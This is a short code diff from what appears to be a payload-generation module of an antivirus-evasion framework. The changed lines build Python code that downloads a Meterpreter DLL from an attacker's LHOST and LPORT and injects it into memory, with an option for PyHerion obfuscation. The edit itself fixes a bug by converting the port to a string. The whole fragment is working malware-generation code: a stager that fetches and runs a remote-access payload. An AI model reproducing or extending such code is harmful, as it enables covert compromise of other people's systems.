@@ -133,7 +133,7 @@ class PayloadModule:
 
         # download the metpreter .dll and inject it
         payload_code += '\t' * num_tabs_required + data2Name + " = ''\n"
-        payload_code += '\t' * num_tabs_required + data2Name + " = " + downloadMethodName + "(\"" + self.required_options["LHOST"][0] + "\", " + self.required_options["LPORT"][0] + ")\n"
+        payload_code += '\t' * num_tabs_required + data2Name + " = " + downloadMethodName + "(\"" + self.required_options["LHOST"][0] + "\", " + str(self.required_options["LPORT"][0]) + ")\n"
         payload_code += '\t' * num_tabs_required + injectMethodName + "(" + data2Name + ")\n"
 
         if self.required_options["USE_PYHERION"][0].lower() == "y":
